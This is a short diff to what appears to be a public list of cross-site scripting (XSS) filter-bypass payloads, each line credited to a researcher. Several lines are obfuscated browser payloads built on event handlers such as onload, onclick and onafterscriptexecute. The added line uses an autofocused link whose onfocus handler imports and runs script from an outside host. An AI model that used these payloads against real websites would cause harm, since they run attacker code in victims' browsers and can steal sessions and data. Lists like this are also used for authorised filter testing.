@@ -8,3 +8,4 @@
 <svg onload\r\n=$.globalEval("al"+"ert()");>
 <x/onclick=globalThis&lsqb;'\u0070r\u006f'+'mpt']&lt;)>clickme   (working)-Pinaki @0xInfection(Make sure to URL encode the payload properly)
 tarun"><x/onafterscriptexecute=confirm%26lpar;)// -@sratarun
+<A HRef=//X55.is AutoFocus %26%2362 OnFocus%0C=import(href)>
